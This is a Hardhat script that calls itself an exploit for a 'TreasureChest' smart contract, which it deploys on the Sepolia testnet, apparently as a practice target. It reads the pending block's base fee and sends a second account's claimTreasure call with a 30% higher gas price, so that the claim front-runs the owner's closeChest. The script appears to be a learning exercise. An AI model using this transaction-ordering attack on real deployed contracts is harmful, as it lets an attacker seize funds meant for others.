import {ethers, network} from "hardhat";

async function main() {

    /*
        This exploit is to be run on the sepolia testnet network 
        and not hardhat network
        Sepolia has already been added to this project and can be invoked during the run command
        by adding option and value: '--network sepolia' at end of the command
    */

    const blockInfo = await network.provider.send("eth_getBlockByNumber", [
        "pending",
        false
    ])

    const baseFee = blockInfo.baseFeePerGas;
    console.log(baseFee)

    const numBaseFee = parseInt(baseFee, 16)
    //Since baseFeePerGas is a hex value returned in string format.
    console.log(numBaseFee)

    const per30 = Math.round(numBaseFee * 30 / 100)
    const fee1 = numBaseFee + per30
    // Required to be 28% more, we have given 30% more for ensuring success of exploit


    const TC = await ethers.getContractFactory("TreasureChest")
    const [add1, add2] = await ethers.getSigners()

    const tc = await TC.connect(add1).deploy()
    console.log(`TreasureChest Contract deployed at address : ${tc.target}`)

    await tc.connect(add1).openTreasure(500)

    await tc.connect(add1).closeChest({gasPrice : baseFee})

    await tc.connect(add2).claimTreasure({gasPrice: fee1})

}

main().catch((error) => {
    console.error(error)
    process.exitCode=1
})